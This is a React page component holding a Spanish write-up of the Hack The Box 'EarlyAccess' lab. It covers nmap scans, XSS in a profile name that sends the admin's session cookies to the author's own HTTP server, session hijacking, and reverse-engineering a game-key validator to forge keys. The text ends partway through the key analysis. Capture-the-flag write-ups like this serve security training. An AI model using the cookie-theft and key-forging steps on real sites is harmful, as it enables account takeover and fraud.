import { CodeText } from '../../Components/CodeText'
import { Paragraph } from '../../Components/Paragraph'
import { SubThreeTitle } from '../../Components/Sub3Title'
import { SubFourTitle } from '../../Components/Sub4Title'
import { SubTitle } from '../../Components/SubTitle'
import { ContentBlock } from '../../Layout/ContentBlock'
import Image from 'next/image'
import { Highlighter } from '../../utils/SyntaxHighlighter'

export function EarlyAccess() {
  return <>
    <ContentBlock>
      <Paragraph>
        La maquina de una compania de juegos,
        incluiremos un XSS y seguidamente un SQLI para ganar acceso de Admin a la pagina de login, luego nos moveremos por el subdominio <i>game.earlyaccess.htb</i> y <i>dev.earlyaccess.htb</i>.
      </Paragraph>
      <Paragraph>
        Inyectaremos un payload una vez siendo Admin y obtendremos una consola en un contenedor de Docker, luego atacaremos una API para filtrar una contraseña e ingresaremos a otro contenedor de Docker, escalaremos privilegios a root ganando acceso al archivo shadow y la contraseña.
      </Paragraph>
      <Paragraph>
        Por ultimo abusaremos capacidades en <i> /usr/sbin/arp </i>  para leer a travez de arp como root la Flag y la llave SSH.
      </Paragraph>
    </ContentBlock>
    <ContentBlock>
      <SubTitle>
        Reconocimiento
      </SubTitle>
      <SubThreeTitle>
        nmap
      </SubThreeTitle>
      <Paragraph>
        Encontramos 3 puertos abiertos el 22, 80 y el 443
      </Paragraph>
      <Highlighter>
        leo@nardo$ nmap -p- --open --min-rate 5000 -Pn 10.10.11.110 -oG puertosAbiertos
      </Highlighter>
      <CodeText maper={[
        "Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-05 10:00 EDT",
        "Nmap scan report for earlyaccess.htb (10.10.11.110)",
        "Host is up (0.100s latency).",
        "Not shown: 65532 closed ports",
        "PORT    STATE SERVICE",
        "22/tcp  open  ssh",
        "80/tcp  open  http",
        "443/tcp open  https",
        "Nmap done: 1 IP address (1 host up) scanned in 103.76 seconds"
      ]} />
      <Highlighter>
        leo@nardo$ nmap -p 22,80,443 -sCV -oA scans/nmap-tcpscripts 10.10.11.110
      </Highlighter>
      <CodeText
        maper={[
          "Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-05 10:02 EDT",
          "Nmap scan report for earlyaccess.htb (10.10.11.110)",
          "Host is up (0.093s latency).",
          "PORT    STATE SERVICE  VERSION",
          "22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0",
          "| ssh-hostkey:",
          "|   2048 e4:66:28:8e:d0:bd:f3:1d:f1:8d:44:e9:14:1d:9c:64 (RSA)",
          "|   256 b3:a8:f4:49:7a:03:79:d3:5a:13:94:24:9b:6a:d1:bd (ECDSA)",
          "|_  256 e9:aa:ae:59:4a:37:49:a6:5a:2a:32:1d:79:26:ed:bb (ED25519)",
          "80/tcp  open  http     Apache httpd 2.4.38",
          "|_http-server-header: Apache/2.4.38 (Debian)",
          "|_http-title: Did not follow redirect to https://earlyaccess.htb/",
          "443/tcp open  ssl/http Apache httpd 2.4.38 ((Debian))",
          "|_http-server-header: Apache/2.4.38 (Debian)",
          "|_http-title: EarlyAccess",
          "| ssl-cert: Subject: commonName=earlyaccess.htb/",
          "organizationName=EarlyAccess Studios/stateOrProvinceName=Vienna/",
          "countryName=AT",
          "| Not valid before: 2021-08-18T14:46:57",
          "|_Not valid after:  2022-08-18T14:46:57",
          "|_ssl-date: TLS randomness does not represent time",
          "| tls-alpn:",
          "|_  http/1.1",
          "Service Info: Host: 172.18.0.102; OS: Linux; CPE: cpe:/",
          "o:linux:linux_kernel",
          "Service detection performed. Please report any incorrect results at",
          "https://nmap.org/submit/ .",
          "Nmap done: 1 IP address (1 host up) scanned in 14.22 seconds"
        ]}
      />
      <Paragraph>
        Googleando <i>OpenSSH 7.9p1 Debian 10+deb10u2 </i> sabemos que corre un Debian Buster.
      </Paragraph>
      <Paragraph>
        Editamos <i>/etc/hosts </i> y añadimos earlyaccess.htb.
      </Paragraph>
    </ContentBlock>
    <ContentBlock>
      <SubThreeTitle>
        earlyaccess.htb - TCP 443
      </SubThreeTitle>
      <Paragraph>
        Usmeando la pagina vemos un correo <i>admin@earlyaccess.htb</i>, luego decidimos registrarnos e ingresar con nuestra cuenta.
      </Paragraph>
      <Paragraph>
        Una vez dentro nuestra cuenta vemos varias pestañas nuevas Home, Messaging, Forum, Store y Register Key, notamos que al enviar mensajes nos responden al instante probamos alguna SQLI pero no obtenemos nada.
      </Paragraph>
      <Paragraph>
        Sabemos que algunas veces los desarrolladores se enfocan en un solo apartado y se olvidan de otros por ejemplo en la pestaña del perfil tenemos la opcion de cambiar el nombre vemos si al enviar un mensaje con nuestro nuevo nombre <i>&#60;h1&gt;test &#60;h1&#62;</i> se interpreta HTML.
      </Paragraph>
      <Image
        src='/html_injection_gimp.webp'
        layout="responsive"
        width={700}
        height={475}
      />
      <Paragraph>
        Intentamos un secuestro de sesion, ponemos un servidor  por el puerto 80 y esperamos que admin abra nuestro mensaje para que nos llegue sus cookies y lo remplazamos en nuestra session actual.
      </Paragraph>
      <Image
        src='/hijack_session.webp'
        layout="responsive"
        width={828}
        height={113}
      />
      <Highlighter
        text='leo@nardo$ python3 -m http.server 80'
      />
      <CodeText
        maper={[
          "serving HTTP on 0.0.0.0 port 80 (https://0.0.0.0:80) ...",
          "10.10.11.110 - - [10/Ago/2022 21:06:57] 'GET /?cookie=XSFR-TOKEN=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c;%20earlyaccess_session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c HTTP/1.1' 200 -"
        ]}
      />
      <Paragraph />
      <Image
        src='/replace_session.webp'
        layout="responsive"
        width={400}
        height={75}
      />
      <Paragraph>
        Reemplazamos, refrescamos y wualaaaaaa.
        ¡Somos Admin!
      </Paragraph>
    </ContentBlock>
    <ContentBlock>
      <SubThreeTitle >
        game.earlyaccess.htb - TCP 80
      </SubThreeTitle>
      <Paragraph>
        Vemos dos nuevas pestañas game y dev, nos llevan a dos subdominios <i>dev.earlyaccess.htb</i> y <i>game.earlyaccess.htb</i> lo añadimos a <i> /etc/hosts </i> e ingresamos.
      </Paragraph>
      <Paragraph>
        En la pestaña de Admin, vemos Download backup, lo descargamos y obtenemos validate.py
      </Paragraph>
      <Image
        src='/admin_bac.webp'
        layout="responsive"
        width={400}
        height={200}
      />

    </ContentBlock>
    <ContentBlock>
      <SubThreeTitle>
        backup.zip - validate.py
      </SubThreeTitle>
      <SubFourTitle>
        Análisis del algoritmo.
      </SubFourTitle>
      <Paragraph>
        Cortaremos en trozos el algoritmo para leerlo mejor.
      </Paragraph>
      <Highlighter
        text={`
        class Key:    
          key = ""    
          magic_value = "XP" # Static (same on API)    
          magic_num = 346 # TODO: Sync with API (api generates magic_num every 30min)    
          
          def __init__(self, key:str, magic_num:int=346):    
            self.key = key    
            if magic_num != 0:    
              self.magic_num = magic_num

          @staticmethod
          def info() -> str:
            return f"""
            # Game-Key validator #

            can be used to quickly verify a user's game key, when the API is down (again).

            keys look like following:
            AAAAA-BBBBB-CCCC1-DDDDD-1234

            Usage: {sys.argv[0]} <game-key>""" 
        
          def valid_format(self) -> bool:
            return bool(match(r"^[A-Z0-9]{5}(-[A-Z0-9]{5})(-[A-Z]{4}[0-9])(-[A-Z0-9]{5})(-[0-9]{1,5})$", self.key))

          def calc_cs(self) -> int:      
            gs = self.key.split('-')[:-1]                                    
            return sum([sum(bytearray(g.encode())) for g in gs])

          def g1_valid(self) -> bool:
            g1 = self.key.split('-')[0]
            r = [(ord(v)<<i+1)%256^ord(v) for i, v in enumerate(g1[0:3])]
            if r != [221, 81, 145]:
                return False                                     
            for v in g1[3:]:
                try:   
                    int(v)
                except:       
                    return False
            return len(set(g1)) == len(g1)

          def g2_valid(self) -> bool:
            g2 = self.key.split('-')[1]
            p1 = g2[::2]
            p2 = g2[1::2]
            return sum(bytearray(p1.encode())) == sum(bytearray(p2.encode()))

          def g3_valid(self) -> bool:
            # TODO: Add mechanism to sync magic_num with API
            g3 = self.key.split('-')[2]
            if g3[0:2] == self.magic_value:
              return sum(bytearray(g3.encode())) == self.magic_num
            else:
              return False
    
          def g4_valid(self) -> bool:
            return [ord(i)^ord(g) for g, i in zip(self.key.split('-')[0], self.key.split('-')[3])] == [12, 4, 20, 117, 0]

          def cs_valid(self) -> bool:
            cs = int(self.key.split('-')[-1])
            return self.calc_cs() == cs

            def check(self) -> bool:
            if not self.valid_format():
                print('Key format invalid!')
                return False
            if not self.g1_valid():
                return False
            if not self.g2_valid():
                return False
            if not self.g3_valid():
                return False
            if not self.g4_valid():
                return False
            if not self.cs_valid():
                print('[Critical] Checksum verification failed!')
                return False
            return True

        if __name__ == "__main__":
          if len(sys.argv) != 2:    
              print(Key.info())     
              sys.exit(-1)         
          input = sys.argv[1] 
          validator = Key(input) 
          if validator.check():     
              print(f"Entered key is valid!")
          else:                                  
              print(f"Entered key is invalid!")`.trim()
        }
      />
      <Paragraph>
        Vemos que nuestra llave debe tener el formato <strong><i>AAAAA-AAAAA-BBBB1-AAAAA-11111</i></strong> donde <i>A</i> es una letra o número alfanumérico mayúscula de la A a la Z y del 0 al 9, donde <i>B </i> es una letra alfabetica de la A a la Z, y donde <i>1 </i> representa un número del 0 al 9 separado por <i>-</i>.  
      </Paragraph>
      <Highlighter
        text={`def valid_format(self) -> bool:
        return bool(match(r"^[A-Z0-9]{5}(-[A-Z0-9]{5})(-[A-Z]{4}[0-9])(-[A-Z0-9]{5})(-[0-9]{1,5})$", self.key))`.trim()} 
      />
    </ContentBlock>
    <ContentBlock>
      <SubFourTitle>
        g1 - function
      </SubFourTitle>
      <Highlighter
        text={`
          def g1_valid(self) -> bool:
          g1 = self.key.split('-')[0]
          r = [(ord(v)<<i+1)%256^ord(v) for i, v in enumerate(g1[0:3])]
          if r != [221, 81, 145]:
              return False                                     
          for v in g1[3:]:
              try:   
                  int(v)
              except:       
                  return False
          return len(set(g1)) == len(g1)
        `}
      />
      <Paragraph>
        Coje los primeros 3 caracteres y hace un Bitwise Left Shift operator por cada caracter recorriendo 1, 2, 3 bits respectivamente luego hace un modulo de 256 y un Bitwise XOR del mismo caracter y por último el resultado lo compara con 221, 81 y 145.
      </Paragraph>
      <Paragraph>
       Intuimos que concatenando números y todas las letras del alfabeto y aplicando la lógica de la funcion y pasandole la pósicion 0, 1 y 2 obtendremos nuestro <i>g1</i> como en el siguiente script y lo podemos filtrar por 221 luego por 81 y 145.   
      </Paragraph>
        <Highlighter 
          text={`
            #!/usr/bin/python3
            import sys, string

            i = int(sys.argv[1])

            for v in string.ascii_uppercase + string.digits:
            value = (ord(v)<<i+1)%256^ord(v)
            print((f"{v}: {value}: {i}))
          `.trim()}
        />
        <Highlighter
          text={`
            leo@nardo$ python3 script.py 0 | grep 221
          `.trim()}
        />
        <CodeText
         maper={[
          "K: 221: 0",
        ]}
        />
        <Paragraph>
          Obtenemos nuestra cadena màgica para la funcion g1 <i>KEY25</i>, los últimos dos caractes son números arbitrarios pero no únicos. 
        </Paragraph>

        <Highlighter
          text={`
            return len(set(g1)) == len(g1)
          `.trim()}
        />
    </ContentBlock>
    <ContentBlock>
      <SubFourTitle>
        g2 - funcion
      </SubFourTitle>
      <Highlighter
        text={`
          def g2_valid(self) -> bool:
              g2 = self.key.split('-')[1]
              p1 = g2[::2]
              p2 = g2[1::2]
              return sum(bytearray(p1.encode())) == sum(bytearray(p2.encode()))
        `}
      />
      <Paragraph>
        Cogemos la segunda parte de nuestra <i>AAAAA-AAAAA-BBBB1-AAAAA-11111</i>,
        para <i>p1 = "ABCDE"[::2]</i> python coge los caracteres pares en este caso <i>ACE, </i> para <i>p2 = "ABCDE"[1::2]</i> obtenemos <i>BD</i>  en las posiciónes impares.
      </Paragraph>
      <Paragraph>
        Por último debemos comprobar que <i>p1</i> sea igual a <i>p2</i>.
      </Paragraph>
      <Highlighter
        text={`
          g2 = "0H0H0"
          p1 = g2[::2]
          p2 = g2[1::2]
          sum(bytearray(p1.encode()))
          ### 144
          sum(bytearray(p2.encode()))
          ### 144
        `}
      />
    </ContentBlock>
    <ContentBlock>
      <SubFourTitle>
        g3 - funcion
      </SubFourTitle>
      <Paragraph>
        Cogemos la tercera parte de nuestra llave <i>AAAAA-AAAAA-BBBB1-AAAAA-11111</i>,
      </Paragraph>
      <Highlighter
        text={`
        def g3_valid(self) -> bool:
        # TODO: Add mechanism to sync magic_num with API
        g3 = self.key.split('-')[2]
        if g3[0:2] == self.magic_value:
            return sum(bytearray(g3.encode())) == self.magic_num
        else:
            return False
        `}
      />
      <Paragraph>
        
      </Paragraph>
    </ContentBlock>
  </>
}